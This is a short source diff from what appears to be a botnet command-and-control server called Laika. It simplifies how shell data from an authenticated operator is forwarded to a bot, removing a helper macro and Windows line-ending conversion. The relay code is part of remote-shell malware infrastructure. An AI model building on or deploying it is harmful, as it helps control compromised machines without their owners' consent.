@@ -106,13 +106,6 @@ void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT
     laikaC_closeShell(shell);
 }
 
-/* improves readability */
-#define SENDSHELLDATA(peer, data, size, id) \
-    laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA); \
-    laikaS_writeInt(&peer->sock, id, sizeof(uint32_t)); \
-    laikaS_write(&peer->sock, data, size); \
-    laikaS_endVarPacket(peer);
-
 void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
     uint8_t data[LAIKA_SHELL_DATA_MAX_LENGTH];
     struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
@@ -136,51 +129,9 @@ void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_
     /* read data */
     laikaS_read(&authPeer->sock, data, sz);
 
-    /* forward data to peer */
-    if (authPeer->osType == peer->osType) {
-        if (sz + sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH) {
-            /* we need to split the buffer since the packet for c2c->bot includes an id (since a bot can host multiple shells, 
-                while the auth/shell client only keeps track of 1)
-            */
-
-            /* first part */
-            SENDSHELLDATA(peer, data, sz-sizeof(uint32_t), &shell->botShellID);
-
-            /* second part */
-            SENDSHELLDATA(peer, data + (sz-sizeof(uint32_t)), sizeof(uint32_t), &shell->botShellID);
-        } else {
-            SENDSHELLDATA(peer, data, sz, &shell->botShellID);
-        }
-    } else if (authPeer->osType == OS_LIN && peer->osType == OS_WIN) { /* convert data if its linux -> windows */
-        uint8_t *buf = laikaM_malloc(sz);
-        int i, count = 0, cap = sz;
-
-        /* convert line endings */
-        for (i = 0; i < sz; i++) {
-            laikaM_growarray(uint8_t, buf, 2, count, cap);
-
-            switch (data[i]) {
-                case '\n':
-                    buf[count++] = '\r';
-                    buf[count++] = '\n';
-                    break;
-                default:
-                    buf[count++] = data[i];
-            }
-        }
-
-        /* send buffer (99% of the time this isn't necessary, but the 1% can make
-            buffers > LAIKA_SHELL_DATA_MAX_LENGTH. so we send it in chunks) */
-        i = count;
-        while (i+sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH) {
-            SENDSHELLDATA(peer, buf + (count - i), LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t), &shell->botShellID);            
-            i -= LAIKA_SHELL_DATA_MAX_LENGTH;
-        }
-
-        /* send the leftovers */
-        SENDSHELLDATA(peer, buf + (count - i), i, &shell->botShellID);
-        laikaM_free(buf);
-    }
+    /* forward to peer */
+    laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
+    laikaS_writeInt(&peer->sock, &shell->botShellID, sizeof(uint32_t));
+    laikaS_write(&peer->sock, data, sz);
+    laikaS_endVarPacket(peer);
 }
-
-#undef SENDSHELLDATA
